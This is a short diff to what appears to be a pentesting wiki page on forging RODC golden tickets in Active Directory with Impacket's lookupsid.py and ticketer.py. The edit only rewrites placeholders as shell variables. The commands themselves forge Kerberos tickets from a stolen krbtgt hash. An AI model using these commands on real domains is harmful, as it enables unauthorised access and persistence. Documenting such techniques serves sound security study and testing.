@@ -25,7 +25,7 @@ There are [Impacket](https://github.com/fortra/impacket) scripts for each step o
 
 ```bash
 # Find the domain SID
-lookupsid.py -hashes 'LMhash:NThash' 'DOMAIN/DomainUser@DomainController' 0
+lookupsid.py -hashes "ffffffffffffffffffffffffffffffff:$NT_HASH" "$DOMAIN/$USER@$DC_HOST" 0
 
 # Create the RODC golden ticket (with an RC4 key, i.e. NT hash)
 ticketer.py -nthash "$KRBTGT_NT_HASH" -domain-sid "$DOMAIN_SID" -domain "$DOMAIN" -rodcNo "$RODC_NUMBER" $USER
